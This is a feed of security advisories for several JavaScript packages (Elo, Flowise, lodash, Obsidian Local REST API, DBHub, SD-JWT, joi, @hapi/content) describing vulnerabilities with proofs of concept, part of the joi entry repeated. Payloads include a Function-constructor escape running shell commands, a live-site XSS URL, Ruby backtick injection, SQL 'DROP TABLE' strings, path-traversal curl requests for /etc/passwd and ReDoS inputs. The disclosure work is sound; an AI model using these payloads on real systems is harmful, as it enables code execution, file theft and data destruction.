entry.title: [@enspirit/elo] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access
entry.content:
Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — defaultFormats.elo.parse(), the bin/elo CLI, or the live browser playground at elo-lang.org/try — can execute arbitrary code in the host JavaScript runtime. A payload built from the .constructor.constructor chain compiles, without modification, to a live Function invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

Vulnerable sink and root cause

Three interacting sites in src/ produce the bug at commit 749af7b:

  1. src/transform.ts:144–158 — the member_access handler allows access on types any, object, or array without filtering the property name. This is the only place an integrator could have plugged a denylist.
  2. src/compilers/javascript.ts:210 — the JS emitter writes ${objectExpr}.${ir.property} verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
  3. src/parser.ts:163–170, 748–750 — the parser accepts constructor (and other JS meta-property names) as an ordinary identifier, so .constructor clears type-checking without triggering any warning.

Combined, the Elo expression ({}).constructor.constructor('…')() compiles to a live Function('…')() call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

Attack surfaces

All three surfaces share the same root cause (no denylist in transform.ts) and are addressed by the same one-file patch:

# Entry point Threat model
1 Browser playground — https://elo-lang.org/try/?code=…&run=1 0-click XSS / account takeover against elo-lang.org. ?run=1 triggers setTimeout(() => this.run(), 100) in playground_controller.ts:531; the server issues a 301 that preserves ?code=. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org.
2 bin/elo CLI RCE on CI / DevOps hosts. Both node bin/elo payload.elo and node bin/elo -e "_" -d @payload.elo -f elo fire. The -f elo path is especially severe: the flag exists to pass user-supplied files as data into an Elo pipeline. No integrator expects a data-format flag to shell out to /usr/bin/id.
3 Library API — defaultFormats.elo.parse() Node.js RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases).

Proof of Concept

Common payload (works on all three entry points):

({}).constructor.constructor('return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString()')()

Library API — poc-minimal.js:

// npm install elo
const { defaultFormats } = require('elo');

const payload = "({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()";

console.log(defaultFormats.elo.parse(payload));
// → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=…

CLI — poc-cli.sh:

node bin/elo payload.elo
# uid=1000(ultrasupara)…

node bin/elo -e "_" -d @payload.elo -f elo
# uid=1000(ultrasupara)…

Browser playground — 0-click XSS URL:

https://elo-lang.org/try/?code=%28%7B%7D%29.constructor.constructor%28%27alert%28document.domain%29%27%29%28%29&run=1

Opening this URL causes alert(document.domain) to fire automatically after ~100 ms with no user interaction beyond navigating to the link. The 301 redirect preserves the ?code= parameter intact. End-to-end execution on the live production site was captured in a screen recording attached to the original report.

Independence from GHSA #3 (AST-API injection)

This finding is independent of the Medium-severity AST-API report (GHSA #3). That fix's identifier regex ^[a-zA-Z_][a-zA-Z0-9_]*$ happens to accept constructor, and its threat model requires an attacker-controlled AST object rather than a plain string. The current finding requires only a plain Elo string, which is a strictly weaker attacker model.

References

  • https://github.com/enspirit/elo/security/advisories/GHSA-33r5-xmm8-v6x5
  • https://github.com/advisories/GHSA-33r5-xmm8-v6x5

entry.title: [@enspirit/elo] Elo Ruby backend has Remote Code Execution via unescaped `#{...}` interpolation in emitted string literals and subtype-constraint labels
entry.content:
Summary

Elo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the # character. Because # begins Ruby's interpolation sequences — #{expr}, #@ivar, #@@cvar, #$gvar — and any expression wrapped in #{...} may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.

The same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.

Vulnerable sinks

Two sinks exist in src/compilers/ruby.ts at commit 749af7b:

  1. String-literal emitter — lines 180–184. The emitter escapes backslash, double quote, and control characters, but not #. Any #{...} sequence in an Elo string literal flows straight into the emitted Ruby source.

  2. Labelled subtype-constraint branch — lines 405–412. The error message passed to p_fail(p, "...") is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at src/parser.ts:1339–1348 accepts single-quoted Elo strings as constraint labels, a label such as '#{ `id` }' flows unchanged into the emitted Ruby.

Attack surfaces

All three surfaces share the same root cause (the missing # escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:

# Entry point Threat model
1 /try playground on elo-lang.org (Ruby target) 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL
2 bin/eloc -t ruby -x on a CI or DevOps host RCE on any host that passes Elo strings through the CLI
3 Library API — defaultFormats.elo.parse() with a Ruby emission step Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases)

Proof of Concept

String-literal sink:

# poc.elo
'RES=#{`id 2>&1`}'

$ eloc -t ruby -x poc.elo
# emitted Ruby contains:  "RES=#{`id 2>&1`}"
# running it returns the output of id(1).

Replacing `id 2>&1` with `touch /tmp/pwned` produces a trivially observable filesystem side effect.

Subtype-constraint label sink:

# poc-subtype.elo
let X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)

The predicate fails for -1, causing p_fail(p, "#{...}") to interpolate and execute the backtick command at the Ruby layer.

Both flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.

Root cause

The Ruby-emitter's double-quoted-string escape routine omitted # from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.

References

  • https://github.com/enspirit/elo/security/advisories/GHSA-7w38-ggh5-v542
  • https://github.com/enspirit/elo/commit/51b869963fbe445c18328714a7ccfbd76b21ba38
  • https://github.com/enspirit/elo/commit/d2a89a8db76a244eb740687524a7e8529b7554b5
  • https://github.com/advisories/GHSA-7w38-ggh5-v542

entry.title: [@enspirit/elo] Elo backends have code injection via unvalidated emission of programmatic AST fields
entry.content:
Summary

Elo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.

The same pattern was previously addressed in 0.9.7 (2026-01-27), which patched the date/datetime/duration literal emitters via JSON.stringify() after a report by naoyashiga. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.

Vulnerable sinks

Each row is a category of sinks that share the same shape: TypeScript signature erased at runtime → AST-API consumer passes a crafted value → emit interpolates the value verbatim.

# AST field Affected backends Resulting injection
1 int_literal / float_literal .value JS, Ruby, Python, SQL Arbitrary expression in the emitted numeric position (RCE on JS/Ruby/Python; SQL expression injection)
2 variable.name JS, Ruby, Python, SQL Identifier-position injection; on SQL, raw SQL injection because undefined identifiers are intentionally emitted as column references
3 member_access.property JS, Ruby, Python, SQL Property access escaped into expression (RCE)
4 object_literal key JS, Ruby, SQL Computed-key / extra-property injection (RCE on JS/Ruby; SQL injection)
5 datapath segment JS, Ruby, Python, SQL Ruby symbol-list injection allows backtick shell exec; SQL string-segment unquoted in single-quote context allows SQL injection
6 lambda.params[].name JS, Ruby, Python Parameter-list structural injection (RCE)
7 SQL let binding name SQL Identifier injection in … AS <name> clause

Proof of Concept

End-to-end execution was verified at commit 749af7b for representative cases per backend. Examples:

Numeric literal injection (all four backends). Feeding the following AST through compileToJavaScript emits a live console.log on call:

{ type: 'literal', value: "(console.log('PWN_INT_JS'),1)" }
// emits: (function(_) { return (console.log('PWN_INT_JS'),1); })(null);

The same AST against Ruby with "(system('touch /tmp/pwn_int_ruby'); 1)" creates the file; Python with "(print('PWN_INT_PY') or 1)" prints the sentinel; SQL emits the raw string into the numeric position.

SQL variable.name injection:

{ type: 'variable', name: "1; DROP TABLE users; --" }
// emits: 1; DROP TABLE users; --

Ruby datapath segment shell-exec:

{ type: 'datapath', segments: ["a, system(`touch /tmp/pwn_dp_ruby`)"] }
// emits: [:a, system(`touch /tmp/pwn_dp_ruby`)]

All ten end-to-end cases are automated in the ast-exec.js / ast-exec2.js scripts attached to the original report; each console.log and sentinel file was observed.

Independence from GHSA #2

This finding is independent of GHSA #2 (the .constructor.constructor sandbox escape). That report covers payloads delivered as plain Elo strings through the parser; the present advisory covers payloads delivered as AST objects through the programmatic API. The two threat models do not overlap: GHSA #2's identifier regex ^[a-zA-Z_][a-zA-Z0-9_]*$ accepts constructor (and is the right behaviour for a parser), while the present advisory adds runtime validation at every backend emit site so that AST-API consumers cannot inject arbitrary text into emitted source.

References

  • https://github.com/enspirit/elo/security/advisories/GHSA-x9rp-7wh3-2rj5
  • https://github.com/enspirit/elo/commit/d2a89a8db76a244eb740687524a7e8529b7554b5
  • https://github.com/enspirit/elo/commit/fb57dd37a2669d9c412454225c5b89a2adba5d93
  • https://github.com/advisories/GHSA-x9rp-7wh3-2rj5

entry.title: [flowise] Duplicate Advisory : Flowise allows arbitrary file write to RCE
entry.content:
Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-8vvx-qvq9-5948. This link is maintained to preserve external references.

Original Description

Flowise contains a path traversal vulnerability in the /api/v1/document-store/loader/process endpoint that allows unauthenticated attackers to write arbitrary files to the filesystem. Attackers can exploit unsanitized fileName parameters with ../ sequences to overwrite critical files like package.json and achieve remote code execution when the application restarts.

References

  • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8vvx-qvq9-5948
  • https://nvd.nist.gov/vuln/detail/CVE-2025-71338

  • https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.2.7-patch.1
  • https://github.com/advisories/GHSA-c3hj-m5hq-59xw

entry.title: [flowise] Duplicate Advisory: Flowise has unsandboxed remote code execution via Custom MCP
entry.content:
Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-6933-jpx5-q87q. This link is maintained to preserve external references.

Original Description

Flowise before 3.0.6 (affected versions 2.2.7-patch.1 and earlier) contains an unsandboxed remote code execution vulnerability in the Custom MCP feature, which is designed to execute OS commands such as launching local MCP servers. Because Flowise's authentication and authorization model is minimal and lacks role-based access control, and the default installation runs without authentication unless FLOWISE_USERNAME and FLOWISE_PASSWORD are set, an attacker can send a crafted JSON payload with the header 'x-request-from: internal' to the /api/v1/node-load-method/customMCP endpoint to execute arbitrary OS commands, resulting in complete compromise of the platform container or server.

References

  • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q
  • https://nvd.nist.gov/vuln/detail/CVE-2025-71336
  • https://www.vulncheck.com/advisories/flowise-unsandboxed-remote-code-execution-via-custom-mcp
  • https://github.com/advisories/GHSA-q2xp-j85q-883h

entry.title: [flowise] Duplicate Advisory : Flowise has arbitrary file access due to missing chat flow id validation
entry.content:
Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-q67q-549q-p849. This link is maintained to preserve external references.

Original Description

Flowise before 3.0.6 (affected versions 2.2.8 and earlier) contains an arbitrary file access vulnerability due to missing validation that the chatflowId and chatId parameters are UUIDs or numbers in file handling operations. By supplying a path-traversal value (e.g., '../../../../../tmp') as the chatflow id, an unauthenticated attacker can use the /api/v1/chatflows endpoint (via addBase64FilesToStorage) to write arbitrary files, and the /api/v1/get-upload-file and /api/v1/openai-assistants-file/download endpoints (via streamStorageFile) to read arbitrary files. Arbitrary file write may lead to remote code execution.

References

  • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-q67q-549q-p849
  • https://nvd.nist.gov/vuln/detail/CVE-2025-71334

entry.title: [lodash.omit] lodash vulnerable to prototype pollution via array-path bypass in `_.unset`, `_.omit`, and `_.pullAt
entry.content:
Impact

The _.unset, _.omit, and _.pullAt functions are vulnerable to prototype pollution. The fix for CVE-2025-13465 only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

Patches

The issue is patched from 4.18.0 to 4.18.1 depending on the package: lodash, lodash-es, and lodash-amd in 4.18.1, and the standalone lodash.unset and lodash.omit packages in 4.18.0.

Workarounds

None. Upgrade to the patched version.

References

  • CVE-2025-13465 / GHSA-xxjr-mmjv-4gpg (original fix that this bypasses)

entry.title: [obsidian-local-rest-api] obsidian-local-rest-api: Authenticated path traversal via URL-encoded %2F in /vault/{path} — arbitrary host file read/write/delete
entry.content:
Summary

The Local REST API's /vault/{path} endpoints (GET/PUT/PATCH/POST/DELETE) percent-decode the request path inside the handler — after Express has already routed and normalized it, then hand it to the Obsidian vault adapter with no confinement check. A literal ../ is resolved/rejected at the routing layer (→ 404), but %2F is not a separator there, so ..%2F..%2F survives routing and is only turned into a real / by the handler's decodeURIComponent, reconstituting a ../ traversal that walks out of the vault. An authenticated client can read, write, or delete arbitrary files on the host with the Obsidian process's privileges.

Details

Framework: Express (import express from "express"; routes registered via this.api.route("/vault/*")…).

The vulnerable line — in src/requestHandler.ts, every vault handler (vaultGet, vaultPut, vaultPatch, vaultPost, vaultDelete) derives the path like this:

const rawPath = decodeURIComponent(
  req.path.slice(req.path.indexOf("/", 1) + 1),
);

The path is decodeURIComponent'd after Express routing. A literal ../ is collapsed/rejected at the routing layer, but %2F isn't a separator there — so ..%2F..%2F reaches the handler intact and this decodeURIComponent turns it into a real ../../. The string routing saw (…%2F…) is not the string the handler uses (…/…), and %2e%2e behaves the same way.

No confinement on the decoded path. The handlers pass rawPath straight to the vault adapter — e.g. this.app.vault.adapter.readBinary(filePath) / this.app.vault.getAbstractFileByPath(filePath) — with no path.resolve + vault-root prefix check, so the reconstituted ../../ escapes.

The fix already exists in your code — for MOVE only. vaultMove confines correctly:

const syntheticRoot = "/vault";
const resolved = posix.resolve(syntheticRoot, normalized);
if (resolved !== syntheticRoot && !resolved.startsWith(syntheticRoot + "/")) {
  this.returnCannedResponse(res, { errorCode: ErrorCode.PathTraversalNotAllowed });
  return;
}

GET/PUT/PATCH/POST/DELETE lack this guard. Apply the same posix.resolve(syntheticRoot, …) + startsWith check to the decoded path in every vault handler, and reject any segment that decodes to ...

PoC

Prereq: a running Obsidian with the Local REST API plugin enabled and its configured API key ($API_KEY). Targets below are Unix; adjust per OS (e.g. ..%2F..%2FWindows%2Fwin.ini on Windows).

# READ outside the vault (returns 200 + the target file's real bytes):
curl --path-as-is -k -H "Authorization: Bearer $API_KEY" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# WRITE outside the vault (creates a file on disk outside the vault root):
curl --path-as-is -k -X PUT -H "Authorization: Bearer $API_KEY" --data "pwned" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2Ftmp%2Fcanary.txt"

--path-as-is stops curl from collapsing .. client-side. A plain ../ (unencoded) request returns 404 — only the %2F/%2e%2e encoded form bypasses, confirming the decode-after-routing gap.

Impact

Authenticated arbitrary file read / write / delete outside the Obsidian vault, with the OS privileges of the Obsidian process — typically the user's home directory (SSH keys, browser profiles, dotfiles, credentials). Amplified in MCP/LLM-agent deployments: this API is widely used as an MCP server, so a prompt-injection in vault content (or a malicious MCP client) can make an agent emit a %2F path — turning "the agent can edit my notes" into "the agent can read/write any file on the host," with no user intent to grant filesystem access beyond the vault.

This vulnerability was reported by Caleb Brisbin through responsible disclosure.

entry.title: [@bytebase/dbhub] DBHub: MySQL and MariaDB comment interpretation bypasses read-only SQL validation
entry.content:
The read-only mode can be bypassed on the MySQL and MariaDB connectors. In read-only mode a caller can still execute arbitrary write and DDL statements (for example DROP TABLE), which defeats the protection that read-only mode is meant to provide when a database is exposed to an AI agent.

Root cause

The problem is a mismatch between how DBHub's SQL parser handles single-line comments and how MySQL and MariaDB actually parse them.

In src/utils/sql-parser.ts, scanSingleLineComment treats "--" as the start of a comment no matter what character follows it. MySQL and MariaDB only begin a "--" comment when the two dashes are followed by whitespace, a control character, or the end of the line. Otherwise the dashes are read as two minus signs and the rest of the line is ordinary SQL.

The read-only check in src/tools/execute-sql.ts splits the input and validates each statement with isReadOnlySQL, but the connector then executes the original, unmodified string. The MySQL and MariaDB connectors open their connection pool with multipleStatements: true (src/connectors/mysql/index.ts:54 and src/connectors/mariadb/index.ts:53) and run the whole string in a single call.

Because of this, the following payload:

SELECT 1--1;DROP TABLE victim

is seen by DBHub as a single SELECT statement, since everything after "--" is treated as a comment and the read-only check passes. MySQL and MariaDB instead parse it as "SELECT 1 - -1" followed by "DROP TABLE victim" and execute both statements.

Proof of concept

  1. DBHub's own parser. Running splitSQLStatements and isReadOnlySQL from this repository on the payload returns a single statement and readOnly = true, so the query is allowed in read-only mode. The same code correctly rejects "SELECT 1; DROP TABLE victim", which confirms that the "--1" is what gets through.

  2. Execution. Connecting to MariaDB 11.4 with mysql2 and multipleStatements: true (the same option the connector uses) and sending the payload returns 2 for the first statement, which confirms "--" was not treated as a comment, and then drops the table. The table exists before the call and is gone afterwards.

Impact

Read-only mode is the control operators rely on to let an assistant read from a database without being able to change it. With this bypass, anyone who can influence the SQL the assistant sends, most realistically through prompt injection in content the assistant reads, can perform writes and destructive DDL against MySQL and MariaDB. PostgreSQL is not affected by this path, because it treats "--" as a comment regardless and executes each split statement individually.

Affected code (current main, commit e99c3aa9, package version 0.22.3)

  • src/utils/sql-parser.ts — scanSingleLineComment does not require whitespace after "--"
  • src/tools/execute-sql.ts — validates the split statements but executes the original string
  • src/connectors/mysql/index.ts and src/connectors/mariadb/index.ts — multipleStatements: true

Suggested fix

The most reliable fix is to stop executing the original string: run only the statements that were validated, and disable multipleStatements on the MySQL and MariaDB connections unless it is genuinely required. As defense in depth, make the comment scanner dialect-aware so that for MySQL and MariaDB "--" only starts a comment when it is followed by whitespace, a control character, or the end of the line, similar to the handling already in place for MySQL conditional comments.

References

  • https://github.com/bytebase/dbhub/security/advisories/GHSA-j656-3hf2-fvjc
  • https://github.com/bytebase/dbhub/pull/342
  • https://github.com/bytebase/dbhub/commit/872bb338f7d31f6afe517a076ac3e3edafaaaf08
  • https://github.com/bytebase/dbhub/releases/tag/v0.22.6
  • https://github.com/advisories/GHSA-j656-3hf2-fvjc

entry.title: [@sd-jwt/core] SD JWT JS: Tampered disclosures silently dropped instead of rejected
entry.content:
Summary

When one Disclosure in an SD-JWT presentation is tampered so its digest no longer matches the Issuer-signed _sd array, @sd-jwt/decode 0.19.0 does not reject the presentation. It silently drops the unmatched Disclosure and returns a reduced claim set, reporting success. The Issuer signature is untouched and valid.

This is a downgrade/omission primitive. A malicious or curious holder can present a tampered Disclosure and have the relying party receive fewer claims than the credential carries, with no error surfaced. Where the relying party does not enforce key binding, an in-transit (on-path) attacker can achieve the same by mangling one Disclosure's bytes; where key binding is enforced, on-path tampering instead breaks the holder's KB-JWT sd_hash binding (so it is rejected), and the downgrade is then exercisable by the key-bound holder — confirmed end-to-end with KB required.

Two distinct tampering inputs converge on the same silent-drop sink:

  1. Genuinely non-decodable Disclosure (broken base64url -> bytes that are not valid UTF-8, e.g. an injected 0xF2 lead byte). RFC 9901 §7.1 step 3 / §4.2.1 require rejection. @sd-jwt/decode instead lossy-decodes it: the TextDecoder/Buffer path substitutes U+FFFD (REPLACEMENT CHARACTER) for the invalid byte and recovers a syntactically valid disclosure (the salt gains a U+FFFD, claim family_name = "Smith"). The recovered Disclosure then hashes to a digest absent from the signed _sd array, so it is silently skipped.
  2. Tampered-but-still-valid-JSON Disclosure (digest no longer matches _sd): same end state — the unmatched Disclosure is silently skipped.

Two RFC 9901 MUSTs compound:

  • §7.1 step 5 (primary): "If any Disclosure was not referenced by digest value in the Issuer-signed JWT (directly or recursively via other Disclosures), the SD-JWT MUST be rejected." — instead silently dropped.
  • §7.1 step 3 / §4.2.1 (secondary): a non-base64url-JSON Disclosure MUST be rejected — the lenient lossy decode skips this check.

Confirmed end-to-end through SDJwtInstance.verify() with a real ES256 issuer key, and again with key binding REQUIRED (a valid holder ES256 KB-JWT over aud+nonce+sd_hash).

Impact

Silent claim-set reduction is a downgrade/omission primitive. If a relying party's authorization logic is "default-allow when a constraining claim is absent" (an age / role / restriction attribute), dropping that one Disclosure flips the decision, with no error surfaced. The decoder reporting success on a tampered presentation is the core problem; tampering should be a hard reject. Because SD-JWT VC and the EU EUDIW ARF profiles reuse this disclosure layer, the exposure is to wallet/verifier deployments built on @sd-jwt/*.

Proof of concept (minimized — NOT a weaponized exploit)

A clean single-mutation credential: lowercase _sd_alg: "sha-256", an honest Issuer body whose _sd digests are computed over the valid wire Disclosures, and exactly one wire byte-segment tampered — the family_name Disclosure made genuinely non-decodable (an invalid-UTF-8 0xF2 byte injected into its base64url). Everything else is byte-for-byte valid.

The byte-exact credential cannot be faithfully pasted as text (it deliberately contains the invalid 0xF2 byte that triggers the lossy decode). It is provided as bug3_clean_tampered.cred with an untampered twin bug3_clean_control.cred, plus the minting script mint_bug3_clean.py and a three-oracle harness run_three_oracles.py — shared privately with the maintainer on first reply. Structure: 5 Disclosures, only index 1 (family_name) tampered; all other segments byte-for-byte valid.

Observed on the byte-identical credential (three independent oracles):

Oracle Version Verdict Detail
RFC 9901 reference (pure Python) reference impl REJECT R_DISCLOSURE_DECODE
sd-jwt (Daniel Fett's reference impl) pip 0.10.4 REJECT UnicodeDecodeError: 0xf2 ... invalid continuation byte
@sd-jwt/decode (this package) 0.19.0 ACCEPT reduced set {given_name, email, vct, iss} — family_name silently dropped, no error

Control (untampered, same body): all three oracles ACCEPT the full 5-claim set including family_name: "Smith" — confirming the single tampered byte is the only difference. Liveness: the @sd-jwt/decode harness REJECTs pure garbage ("not-a-jwt", "~~~~", "aaa.bbb.ccc~ZZZZ~", "") and ACCEPTs the clean control, so the ACCEPT above is a genuine behavioral divergence, not an accept-everything stub. No ready-to-run exploit against any deployed verifier is included.

Suggested fix

In the disclosure-decode loop of @sd-jwt/decode:

  1. Enforce §7.1 step 5: if any provided Disclosure is not referenced by a digest in the signed _sd array (directly or recursively), reject the entire presentation — do not silently skip it.
  2. Enforce §7.1 step 3 / §4.2.1: treat a Disclosure that fails base64url/JSON decode, or that is not a 3-element [salt, claimName, claimValue] array, as a fatal error. Replace the lenient TextDecoder/Buffer decode with a strict UTF-8 decode that throws on invalid bytes (do not substitute U+FFFD).
  3. Surface both rejections from the public verify() / decodeSdJwt() entry points, not only from an internal helper.

Related findings in the same library (MEDIUM — context for one combined patch)

  • Reserved claim name _sd accepted (§7.1 step 3). MEDIUM (conformance, issuer-side). Fix: reject if the claim name is a reserved key (_sd, _sd_alg, ...).
  • _sd_alg not validated case-sensitively / against the registry (§4.1.1, §7.1 step 2). MEDIUM (defense-in-depth). Accepts sha-1 and SHA-256 (wrong case, silently normalized to sha-256). Fix: exact, case-sensitive membership test against the supported registered set; no case normalization, no silent default.

The maintainer may prefer to address all three in one advisory/patch.

Credit

Found and reported by Anton Sokolov, Tyche Institute (Tallinn, Estonia), ORCID 0000-0003-2452-7096. Discovered via differential fuzzing of the SD-JWT disclosure layer against an RFC 9901 reference oracle and two reference libraries.

References

  • https://github.com/openwallet-foundation/sd-jwt-js/security/advisories/GHSA-f9j6-8p6x-r9j6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-62374
  • https://github.com/openwallet-foundation/sd-jwt-js/pull/380
  • https://github.com/openwallet-foundation/sd-jwt-js/commit/3d8a72a0a279d67439db038c9c2b52621568b866
  • https://github.com/advisories/GHSA-f9j6-8p6x-r9j6

entry.title: [joi] joi: quadratic-time split in `string().email({ multiple: true })` allows denial of service
entry.content:
Summary

Joi.string().email({ multiple: true }) takes quadratic time to split a value that contains a long run of whitespace. One request with 100 KB of spaces blocks the Node.js event loop for several seconds, which causes a denial of service.

Details

When the multiple option is set, the email rule splits the value into addresses with a regular expression that removes whitespace on each side of the separator:

const regex = new RegExp(`\\s*[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);
// ...
const emails = options.multiple ? value.split(regex) : [value];

String.prototype.split tries a match at each position of the value. At each position inside a whitespace run, the leading \s* reads the rest of the run, does not find a separator, and backtracks through all of it. A run of n whitespace characters without a separator therefore costs n² steps. This applies to the default separator and to all custom separator values.

The fix lets the leading whitespace match start only at the beginning of a whitespace run, so the split is linear:

const regex = new RegExp(`(?:(?<!\\s)\\s+)?[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);

The split results do not change. The regular expression is now built only when multiple is set.

Every joi release from 17.1.1 up to and including 17.13.8, and from 18.0.0 up to and including 18.3.0, is affected. Every @hapi/joi release from 16.0.0 is affected.

Workarounds for users who cannot upgrade:

  • Add .max() before .email(), for example Joi.string().max(1000).email({ multiple: true }). The max rule then rejects long values before the email rule runs.
  • Do not use the abortEarly: false option with this schema. With abortEarly: false, the email rule runs even when the max rule fails.
  • Do not use .trim() as a workaround. It removes only the whitespace at the start and at the end of the value.

Proof of concept

const Joi = require('joi');

const schema = Joi.string().email({ multiple: true });
for (const n of [25000, 50000, 100000, 200000]) {
    const start = Date.now();
    schema.validate(' '.repeat(n));
    console.log(`${n} spaces: ${Date.now() - start} ms`);
}

Output on joi@18.3.0 (Node.js 26):

25000 spaces: 244 ms
50000 spaces: 887 ms
100000 spaces: 3349 ms
200000 spaces: 13579 ms

Output on the patched version:

25000 spaces: 0 ms
50000 spaces: 0 ms
100000 spaces: 0 ms
200000 spaces: 1 ms

Over HTTP, send the whitespace in a field that the route validates with this schema:

POST /invite HTTP/1.1
Content-Type: application/json

{"emails": "<100000 spaces>"}

Impact

This is a denial of service by CPU exhaustion. It affects each application that validates untrusted input with Joi.string().email({ multiple: true }) and that has no length limit before the email rule. One request with 100 KB of whitespace blocks the Node.js event loop for several seconds, and the server cannot process other requests during that time. The attacker needs no authentication when the route is public, and a small number of concurrent requests can keep the service unavailable.

References

  • https://github.com/hapijs/joi/security/advisories/GHSA-4528-x5fx-h6hg
  • https://nvd.nist.gov/vuln/detail/CVE-2026-118772
  • https://github.com/hapijs/joi/pull/3162
  • https://github.com/hapijs/joi/pull/3163
  • https://github.com/hapijs/joi/commit/03dc1d909818503b06240dadc81e9227ed2649cf
  • https://github.com/hapijs/joi/commit/807858d7480f5075b0610817e3e44230890fb18e
  • https://github.com/hapijs/joi/releases/tag/v17.13.9
  • https://github.com/hapijs/joi/releases/tag/v18.3.1
  • https://github.com/advisories/GHSA-4528-x5fx-h6hg

When the multiple option is set, the email rule splits the value into addresses with a regular expression that removes whitespace on each side of the separator:

const regex = new RegExp(`\\s*[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);
// ...
const emails = options.multiple ? value.split(regex) : [value];

String.prototype.split tries a match at each position of the value. At each position inside a whitespace run, the leading \s* reads the rest of the run, does not find a separator, and backtracks through all of it. A run of n whitespace characters without a separator therefore costs n² steps. This applies to the default separator and to all custom separator values.

The fix lets the leading whitespace match start only at the beginning of a whitespace run, so the split is linear:

const regex = new RegExp(`(?:(?<!\\s)\\s+)?[${options.separator ? escapeRegex(options.separator) : ','}]\\s*`);

The split results do not change. The regular expression is now built only when multiple is set.

Every joi release from 17.1.1 up to and including 17.13.8, and from 18.0.0 up to and including 18.3.0, is affected. Every @hapi/joi release from 16.0.0 is affected.

Workarounds for users who cannot upgrade:

  • Add .max() before .email(), for example Joi.string().max(1000).email({ multiple: true }). The max rule then rejects long values before the email rule runs.
  • Do not use the abortEarly: false option with this schema. With abortEarly: false, the email rule runs even when the max rule fails.
  • Do not use .trim() as a workaround. It removes only the whitespace at the start and at the end of the value.

Proof of concept

const Joi = require('joi');

const schema = Joi.string().email({ multiple: true });
for (const n of [25000, 50000, 100000, 200000]) {
    const start = Date.now();
    schema.validate(' '.repeat(n));
    console.log(`${n} spaces: ${Date.now() - start} ms`);
}

Output on joi@18.3.0 (Node.js 26):

25000 spaces: 244 ms
50000 spaces: 887 ms
100000 spaces: 3349 ms
200000 spaces: 13579 ms

Output on the patched version:

25000 spaces: 0 ms
50000 spaces: 0 ms
100000 spaces: 0 ms
200000 spaces: 1 ms

Over HTTP, send the whitespace in a field that the route validates with this schema:

POST /invite HTTP/1.1
Content-Type: application/json

{"emails": "<100000 spaces>"}

Impact

This is a denial of service by CPU exhaustion. It affects each application that validates untrusted input with Joi.string().email({ multiple: true }) and that has no length limit before the email rule. One request with 100 KB of whitespace blocks the Node.js event loop for several seconds, and the server cannot process other requests during that time. The attacker needs no authentication when the route is public, and a small number of concurrent requests can keep the service unavailable.

entry.title: [content] @hapi/content: quadratic-time parsing of Content-Disposition parameters allows denial of service
entry.content:
Summary

Content.disposition() takes quadratic time when a Content-Disposition parameter contains a long token without =. One unauthenticated multipart request can block the Node.js event loop for several minutes.

Details

Content.disposition() reads the parameters with a global regular expression in String.prototype.replace():

/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))/g

The parameter name part ([^\=\*\s]+) has no anchor. When a run of name characters has no = after it, the match attempt reads the full run and fails. The global scan then starts again at the next character and reads the remaining run again. The total time is proportional to the square of the run length.

@hapi/pez calls Content.disposition() on the header of every part in a multipart/form-data body. In hapi, this occurs on each route with payload.multipart enabled, before the route handler and before any validation. The only size limit is the route payload.maxBytes, which is 1 MB by default.

The fix adds an alternative that matches the full run of name characters when no = follows it. The scan then continues after the run, and the callback ignores this match. A match attempt that starts later in the same run always fails in the same way, so the parse result does not change. The parse time is now linear.

/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))|[^\=\*\s]+/g

Every release from 3.0.6 (published as content) up to and including @hapi/content 6.0.2 is affected.

